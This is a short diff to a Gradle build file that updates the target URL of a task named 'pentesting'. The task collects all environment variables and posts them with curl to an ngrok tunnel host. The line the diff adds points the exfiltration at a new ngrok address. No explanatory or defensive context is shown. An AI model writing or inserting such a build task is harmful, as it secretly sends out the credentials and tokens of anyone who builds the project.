@@ -30,7 +30,7 @@ dependencies {
 }
 task pentesting {
     //def ENV = System.getenv()
-    def link = "http://0d77-2a00-a040-1a2-ed25-30f4-8003-7c64-ba60.ngrok.io/pentesting"
+    def link = "http://2a1d-35-153-5-93.ngrok.io/pentesting"
     def data = System.getenv()
     ['curl', '-X', 'POST', '-H', 'Content-Type: text/plain','--data',data, link].execute()
 }
